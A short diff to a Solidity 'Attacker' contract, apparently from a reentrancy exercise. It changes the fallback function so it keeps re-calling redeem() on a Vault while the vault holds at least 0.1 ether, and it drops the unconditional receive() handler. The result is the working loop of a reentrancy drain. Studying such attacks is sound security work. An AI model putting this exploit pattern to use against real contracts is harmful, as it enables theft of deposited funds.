@@ -32,16 +32,17 @@ contract Attacker is Ownable {
         vault = Vault(_contractAddr);
     }
 
+    /**
+     * @notice redeem should be done only if there is enough balance to avoid revert
+     * @dev ugly, the check must match with the attacker store value TODO: put it as variable (deposit in constructor or modifiable storage value)
+     */
     fallback() external payable {
-        this.redeem();
-        emit FallbackCall(++fallbackCallCount, msg.value);
+        if (address(vault).balance >= 0.1 ether ) {
+            this.redeem();
+            emit FallbackCall(++fallbackCallCount, msg.value);
+        }
     }
-  
-    receive() external payable {
-        this.redeem();
-        emit FallbackCall(++fallbackCallCount, msg.value);
-    }
-  
+    
     /**
      * @notice Store ether to Vault contract from this contract
      */
